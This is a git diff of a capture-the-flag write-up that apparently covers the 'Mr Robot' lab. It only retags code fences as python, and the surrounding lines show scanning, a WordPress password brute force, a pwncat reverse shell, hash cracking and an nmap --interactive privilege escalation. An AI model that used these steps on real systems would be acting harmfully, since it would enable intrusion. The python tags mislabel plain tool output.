@@ -18,7 +18,7 @@ I used rustscan because I like its style and it instantly gives a response after
 rustscan $IP -- -A -sC -sV -oN nmap.txt
 ````````
 
-````````
+````````python
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
 | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
@@ -169,7 +169,7 @@ gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3
 
 ````````
 
-````````
+````````python
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -236,7 +236,7 @@ wpscan --url http://10.10.202.108/wp-login.php -U elliot -P fsocity.dic
 ````````	
 
 
-````````
+````````python
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -348,7 +348,7 @@ http://{IP}/wp-content/themes/twentyfifteen/404.php
 ```
 ## Getting 2 key 
 
-````````
+````````python
 [22:46:01] Welcome to pwncat 🐈!                                                                                                                              __main__.py:164
 [22:46:02] received connection from 10.10.202.108:55888                                                                                                            bind.py:84
 [22:46:05] 0.0.0.0:1234: normalizing shell path                                                                                                                manager.py:957
@@ -373,7 +373,7 @@ nth --text '{REDIRECTED}'
 
 ````````
 
-````````
+````````python
   _   _                           _____ _           _          _   _           _     
  | \ | |                         |_   _| |         | |        | | | |         | |    
  |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
@@ -412,7 +412,7 @@ dynamic_39 MD2, JtR: md2 Snefru-128, JtR: snefru-128 DNSSEC(NSEC3), HC: 8300  RA
 hashcat -m 0 {REDACTED} /usr/share/wordlists/rockyou.txt --force
 ````````
 
-````````
+````````python
 hashcat (v6.2.5) starting
 
 You have enabled --force to bypass dangerous warnings and errors!
@@ -483,7 +483,7 @@ Stopped: Fri May 20 23:20:12 2022
 
 ### Login as robot
 
-````````
+````````python
 (remote) daemon@linux:/home/robot$ su robot
 Password: 
 robot@linux:~$ cat key-2-of-3.txt 
@@ -494,7 +494,7 @@ robot@linux:~$
 
 ## Privilage esculation
 
-````````
+````````python
 (remote) robot@linux:/tmp$ /usr/local/bin/nmap --interactive
 
 Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
